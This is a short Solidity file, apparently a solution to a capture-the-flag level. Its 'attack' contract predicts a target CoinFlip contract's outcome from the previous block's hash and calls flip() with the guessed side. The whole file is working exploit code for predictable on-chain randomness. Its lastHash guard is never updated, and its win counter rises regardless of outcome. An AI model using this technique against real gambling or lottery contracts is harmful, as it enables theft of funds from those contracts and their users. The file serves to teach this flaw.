// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract CoinFlip{
    function flip(bool) public returns (bool) {}
}
contract attack {
    CoinFlip CF;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address vic){
        CF = CoinFlip(vic);
    }
        function Tattack() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number-1));
        require(blockValue!=lastHash,"Wait for next Block");
        uint256 coinFlip = blockValue/(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        CF.flip(side);
        consecutiveWins+=1;
        return side;
    }
}